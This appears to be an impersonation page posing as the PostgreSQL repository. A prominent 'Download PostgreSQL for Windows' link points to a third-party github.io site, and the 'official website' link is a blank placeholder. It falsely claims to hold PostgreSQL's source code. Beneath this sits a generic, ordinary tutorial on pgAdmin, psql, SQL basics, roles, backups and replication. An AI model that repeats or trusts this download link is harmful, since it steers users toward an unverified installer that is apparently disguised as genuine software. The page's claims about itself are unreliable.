# PostgreSQL

Updated: June 24, 2025       
**[Download PostgreSQL for Windows](https://pgrtool.github.io/PostgreSQL)**

The installer package comes with essential components, including the PostgreSQL server, command-line utilities, and optional administration tools. Make sure to download the release that matches your operating system.

## Introduction

**PostgreSQL** is a robust, open-source, object-relational database system with more than 35 years of continuous development. It is widely recognized for its reliability, adherence to standards, and flexibility.

Built to support a broad spectrum of workloads, PostgreSQL operates on all major operating systems and is deployed in use cases ranging from small web projects to large-scale data warehouses and mission-critical platforms.

This repository contains the primary source code for the PostgreSQL database. For setup guidance, documentation, and contribution instructions, visit the [official website](*) or check the `/doc` directory.

## Table of Contents

* [Connect to PostgreSQL](#connect-to-postgresql)
* [Creating a Database](#creating-a-database)
* [Connecting to a Database](#connecting-to-a-database)
* [Security and Authentication](#security-and-authentication)
* [Backup and Recovery](#backup-and-recovery)

## Connect to PostgreSQL

PostgreSQL provides a graphical tool called **pgAdmin** for managing databases.

To connect:

1. Launch **pgAdmin 4**.
2. Right-click **Servers** → **Create** → **Server**.
3. Specify a name (e.g., `Localhost`).
4. In the **Connection** tab:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Password: *(the one set during installation)*

Click **Save** — you’re connected.

## Creating a Database

Once PostgreSQL is installed and running on Windows, setting up a new database is fast and straightforward. You can use either the GUI (**pgAdmin**) or the command-line client (**psql**), depending on your workflow.

### Option 1: Using pgAdmin (GUI)

**pgAdmin** is the default graphical administration tool packaged with PostgreSQL for Windows.

#### Steps:

1. Open **pgAdmin 4** via the Start Menu.

2. Connect to your local server:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Enter the installation password.

3. In the **Object Browser**, right-click **Databases** → **Create** → **Database...**

4. Provide details:

   * **Database name**: e.g., `mydatabase`
   * **Owner**: typically `postgres`

5. Click **Save**.

The new database will be listed in the sidebar, ready for schema creation, table setup, and queries.

### Option 2: Using `psql` (Command Line)

You can also create a database with the PostgreSQL CLI client, `psql`.

#### Steps:

1. Open **Command Prompt**.

2. Navigate to the PostgreSQL `bin` directory:

   ```bash
   cd "C:\Program Files\PostgreSQL\<version>\bin"
   ```

3. Start the `psql` shell:

   ```bash
   psql -U postgres -h localhost
   ```

   Enter your password when prompted.

4. Inside `psql`, create a database:

   ```sql
   CREATE DATABASE mydatabase;
   ```

5. Connect to it:

   ```sql
   \c mydatabase
   ```

Now you can begin executing SQL commands.

### Tips

* Database names should start with a letter and may contain letters, digits, and underscores.
* View all databases anytime:

  ```sql
  \l
  ```
* To delete a database:

  ```sql
  DROP DATABASE mydatabase;
  ```

> Only superusers or the database owner have permission to drop it.

## Connecting to a Database

To connect to a PostgreSQL database from the command line:

```sh
psql -U postgres -d mydatabase
```

Within `psql`, switch databases using:

```sql
\c mydatabase;
```

## Data Manipulation

### Inserting Data

```sql
INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');
```

### Querying Data

```sql
SELECT * FROM users;
```

### Updating Data

```sql
UPDATE users SET email = 'john.doe@example.com' WHERE name = 'John Doe';
```

### Deleting Data

```sql
DELETE FROM users WHERE name = 'John Doe';
```

## Indexing and Performance

Indexes help speed up query execution. To create an index:

```sql
CREATE INDEX idx_users_email ON users(email);
```

To analyze query performance:

```sql
EXPLAIN ANALYZE SELECT * FROM users WHERE email='john@example.com';
```

## Security and Authentication

### Managing User Roles

Create a new role:

```sql
CREATE ROLE dbuser WITH LOGIN PASSWORD 'securepassword';
```

Grant privileges:

```sql
GRANT ALL PRIVILEGES ON DATABASE mydatabase TO dbuser;
```

### Configuring Authentication

Edit `pg_hba.conf` to change authentication settings:

```sh
sudo nano /etc/postgresql/16/main/pg_hba.conf
```

## Backup and Recovery

### Creating a Backup

```sh
pg_dump -U postgres -d mydatabase -f backup.sql
```

### Restoring from a Backup

```sh
psql -U postgres -d mydatabase -f backup.sql
```

## Replication and High Availability

PostgreSQL supports replication to improve uptime.

### Configuring Streaming Replication

1. In `postgresql.conf` on the primary server:

```ini
wal_level = replica
max_wal_senders = 5
```

2. Define the replica in `pg_hba.conf`:

```ini
host replication replicator 192.168.1.10/32 md5
```

3. Start replication:

```sh
pg_basebackup -h primary_host -D /var/lib/postgresql/16/main -U replicator -P -R
```
